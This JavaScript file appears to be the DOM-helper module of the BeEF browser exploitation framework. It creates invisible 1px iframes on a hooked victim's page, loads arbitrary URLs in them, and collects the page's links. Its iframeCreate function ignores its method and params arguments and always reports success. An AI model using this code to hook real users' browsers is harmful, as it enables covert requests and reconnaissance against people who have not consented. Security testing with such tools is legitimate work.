/*!
 * @literal object: beef.dom
 *
 * Provides functionalities to manipulate the DOM.
 */
beef.dom = {
	
	/**
	 * Creates a new element but does not append it to the DOM.
	 * @param: {String} the name of the element.
	 * @param: {Literal Object} the attributes of that element.
	 * @return: the created element.
	 */
	createElement: function(type, attributes) {
		var el = document.createElement(type);
		
		for(index in attributes) {
			if(typeof attributes[index] == 'string') {
				el.setAttribute(index, attributes[index]);
			}
		}
		
		return el;
	},
	
	/**
	 * Removes element from the DOM.
	 * @param: {String or DOM Object} the target element to be removed.
	 */
	removeElement: function(el) {
		if (!beef.dom.isDOMElement(el))
		{
			el = document.getElementById(el);
		}
		try {
			el.parentNode.removeChild(el);
		} catch (e) { }
	},
	
	/**
	 * Tests if the object is a DOM element.
	 * @param: {Object} the DOM element.
	 * @return: true if the object is a DOM element.
	 */
	isDOMElement: function(obj) {
		return (obj.nodeType) ? true : false;
	},
	
	/**
	 * Creates an invisible iframe on the hook browser's page.
	 * @return: the iframe.
	 */
	createInvisibleIframe: function() {
		var iframe = this.createElement('iframe', {
				width: '1px',
				height: '1px',
				style: 'visibility:hidden;'
			});
		
		document.body.appendChild(iframe);
		
		return iframe;
	},
	
	/**
	 * @params: {String} url: target url which is loaded in the iframe.
	 * @params: {String} method: whether to use a GET or POST HTTP method.
	 * @params: {Hash} params: list of params that will be sent in request.
	 * @params: {Boolean} hidden: whether to make the iframe hidden.
	 * @params: {Boolean} remove: whether to remove the iframe from the dom once it is loaded.
	 * @return: {String} result: success, failure or timeout
	 */

	iframeCreate: function(url, method, params, hidden, remove){
		if (hidden){
			var iframe = this.createElement('iframe', {
				width: '1px',
				height: '1px',
				style: 'visibility:hidden;',
				src: url
			});
		} else {
			var iframe = this.createElement('iframe', {
				width: '100%',
				height: '100%',
				src: url
			});
		}
		
		document.body.appendChild(iframe);
		
		var result = "success";
		
		return result;
	},

	
	/**
	 * Get the location of the current page.
	 * @return: the location.
	 */
	getLocation: function() {
		return document.location.href;
	},
	
	/**
	 * Get links of the current page.
	 * @return: array of URLs.
	 */
	getLinks: function() {
		var linksarray = [];
		var links = document.links;
		for(var i = 0; i<links.length; i++) {
			linksarray = linksarray.concat(links[i].href)		
		};
		return linksarray
	}
	
};

beef.regCmp('beef.dom');